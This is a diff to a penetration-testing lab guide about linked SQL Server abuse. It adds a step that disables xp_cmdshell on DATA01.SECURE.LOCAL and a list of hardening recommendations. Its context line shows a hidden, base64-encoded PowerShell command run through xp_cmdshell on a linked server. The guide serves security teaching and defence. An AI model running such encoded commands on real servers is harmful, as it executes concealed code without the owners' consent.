@@ -196,11 +196,22 @@ EXECUTE('exec master..xp_cmdshell ''powershell.exe -w hidden -enc aQBlAHgAIAAoAE
 
 ![](<../../../.gitbook/assets/afbeelding (44).png>)
 
+### Cleanup
+
+1. Execute the following query in HeidiSQL to disable xp\_cmdshell again:
+
+```
+EXEC('sp_configure ''xp_cmdshell'', 0; reconfigure;') AT "DATA01.SECURE.LOCAL"
+EXEC('sp_configure ''show advanced options'', 0; reconfigure;') AT "DATA01.SECURE.LOCAL"
+```
+
 ## Defending
 
 ### Recommendations
 
-
+* Configure the SQL\_Link with the least privilege possible, dont use the sysadmin role.
+* Disable xp\_cmdshell on the SQL Server.
+* Disable RPC OUT on the SQL Server.
 
 ### Detection
 
